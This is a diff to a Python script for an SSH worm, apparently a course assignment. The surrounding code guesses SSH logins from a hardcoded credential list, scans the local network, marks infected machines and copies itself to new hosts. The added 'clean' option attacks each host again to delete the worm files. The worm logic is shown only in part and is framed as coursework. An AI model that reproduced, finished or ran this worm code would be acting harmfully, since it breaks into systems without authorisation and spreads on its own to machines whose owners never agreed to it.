@@ -20,6 +20,26 @@ credList = [
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
+
+
+def cleanInfectedSystem(networkHosts):
+	os.system("rm /tmp/infected.txt")
+	os.system("rm /tmp/worm.py")
+	for host in networkHosts:
+
+	        # Try to attack this host
+        	sshInfo =  attackSystem(host)
+
+	        print sshInfo
+
+
+	        # Did the attack succeed?
+        	if sshInfo:
+			print "Trying to clean..."
+			spreadAndDelete(sshInfo[0])
+			print "Cleaning complete!"
+		pass
+	
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
@@ -68,7 +88,15 @@ def spreadAndExecute(sshClient):
 	# is very similar to that code.	
 	pass
 
-
+def spreadAndDelete(sshClient):
+	sftpClient = sshClient.open_sftp()
+	sshClient.exec_command("rm /tmp/infected.txt")
+	sshClient.exec_command("rm /tmp/worm.py")
+	#sshClient.exec_command("chmod 777 /tmp/infeced.txt")
+	#sshClient.exec_command("chmod 777 /tmp/worm.py")
+	#sftpClient.remove("/tmp/worm.py")
+	#sftpClient.remove("/tmp/Infected.txt")
+	return None
 ############################################################
 # Try to connect to the given host given the existing
 # credentials
@@ -200,24 +228,30 @@ def getHostsOnTheSameNetwork():
 # on attackers system. If you do not like this approach,
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
-# system against the hardcoded IP. 
+# system against the hardcoded IP.
+
 if len(sys.argv) < 2:
 	if isInfectedSystem():
-		exit()
-	else:
-	
+		exit()		
+	else:	
 		markInfected()
+
 				
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice. 
-	pass
+	# Otherwise, proceed with malicious intent.
 
-# TODO: Get the IP of the current system
 
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
+
+#Check if there are arguemnts for cleaning
+if len(sys.argv) >= 2:
+
+	if (sys.argv[1].lower() == "clean") or (sys.argv[1].lower() == "-c" ):
+		cleanInfectedSystem(networkHosts)
+		exit()
 
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
